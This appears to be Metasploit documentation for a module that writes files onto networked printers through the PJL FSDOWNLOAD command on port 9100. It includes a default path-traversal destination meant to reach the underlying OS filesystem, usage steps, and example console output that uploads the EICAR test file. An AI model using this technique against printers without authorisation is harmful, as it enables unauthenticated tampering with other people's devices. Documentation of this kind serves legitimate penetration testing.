## Vulnerable Application

This module targets networked printers that expose the Printer Job Language (PJL) interface on TCP port 9100 (HP JetDirect / AppSocket). It uses the PJL `FSDOWNLOAD` command (which, in PJL nomenclature, downloads data from the client to the device) to write a local file onto the printer's filesystem.

The default remote path (`0:\..\..\..\eicar.com`) uses PJL path traversal to write outside the printer's own volume and potentially into the underlying OS filesystem on devices where the PJL filesystem is mapped to the root. The default local file is Metasploit's bundled EICAR test string, which is safe for verifying write access.

The PRET project ([https://github.com/RUB-NDS/PRET](https://github.com/RUB-NDS/PRET)) documented PJL filesystem write operations; this module is built on the Rex::Proto::PJL library, which draws from that research.

No authentication is required by default on most PJL implementations. Write success depends on the device firmware and filesystem permissions.

## Verification Steps

1. Start `msfconsole`
2. Do: `use auxiliary/scanner/printer/printer_upload_file`
3. Do: `set RHOSTS [target IP or range]`
4. Optionally do: `set LPATH [path to local file to upload]`
5. Optionally do: `set RPATH [PJL destination path on the printer]`
6. Do: `run`
7. A successful write prints a confirmation message including both the local source path and the remote destination path.

## Options

### RHOSTS

The target host(s) or range to scan. Accepts individual IPs, CIDR notation, or a file path prefixed with `file:`. Required.

### RPORT

The TCP port on which the printer's PJL/JetDirect interface is listening. (Default: `9100`)

### LPATH

The path to the local file to upload to the printer. (Default: `<msf-data-dir>/eicar.com`, Required)

### RPATH

The PJL filesystem path on the printer where the file will be written. Uses PJL volume-relative syntax; `\..\` traverses to parent directories. (Default: `0:\..\..\..\eicar.com`, Required)

### THREADS

Number of concurrent scan threads. (Default: `1`)

## Scenarios

### Writing the EICAR test file to a printer using the defaults

Example output (synthesized for documentation purposes; actual values will vary by device):

```
msf6 > use auxiliary/scanner/printer/printer_upload_file
msf6 auxiliary(scanner/printer/printer_upload_file) > set RHOSTS 192.168.1.45
RHOSTS => 192.168.1.45
msf6 auxiliary(scanner/printer/printer_upload_file) > run

[+] 192.168.1.45:9100 - Saved /usr/share/metasploit-framework/data/eicar.com to 0:\..\..\..\eicar.com
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Writing to the printer's own storage volume

```
msf6 auxiliary(scanner/printer/printer_upload_file) > set RPATH 0:\FONTS\test.bin
RPATH => 0:\FONTS\test.bin
msf6 auxiliary(scanner/printer/printer_upload_file) > run

[+] 192.168.1.45:9100 - Saved /usr/share/metasploit-framework/data/eicar.com to 0:\FONTS\test.bin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
